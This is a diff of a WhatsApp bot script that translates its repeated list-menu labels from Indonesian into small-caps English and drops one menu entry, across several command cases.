+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -4999,186 +5180,181 @@ break
 case 'storemenu': {
   let HydroSad = `${storemenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -5192,186 +5368,181 @@ break
 case 'quotesmenu': {
   let HydroSad = `${quotesmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -5385,186 +5556,181 @@ break
 case 'anonymousmenu': {
   let HydroSad = `${anonymousmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
